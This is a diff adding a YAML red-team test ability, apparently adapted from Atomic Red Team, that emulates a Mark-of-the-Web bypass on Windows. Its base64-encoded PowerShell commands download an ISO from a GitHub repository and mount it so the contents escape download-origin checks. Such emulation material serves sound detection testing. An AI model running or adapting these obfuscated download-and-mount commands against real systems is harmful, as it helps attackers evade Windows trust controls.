@@ -1,0 +1,20 @@
+- id: 54f1d482-d23d-5064-97aa-08019ca7d473
+  name: Soumaia ART Tests - Mount ISO image
+  description: 'Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1553.005
+    name: 'Subvert Trust Controls: Mark-of-the-Web Bypass'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQA1ADUAMwAuADAAMAA1AC4AaQBzAG8AIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEANQA1ADMALgAwADAANQAuAGkAcwBvACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADUAMwAuADAAMAA1AC8AYgBpAG4ALwBUADEANQA1ADMALgAwADAANQAuAGkAcwBvACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAVAAxADUANQAzAC4AMAAwADUALgBpAHMAbwAiAAoA
+          }
+          Mount-DiskImage -ImagePath ".\T1553.005.iso"
+        cleanup: |-
+          Dismount-DiskImage -ImagePath ".\T1553.005.iso" | Out-Null
+        payloads:
+        - T1553.005.iso
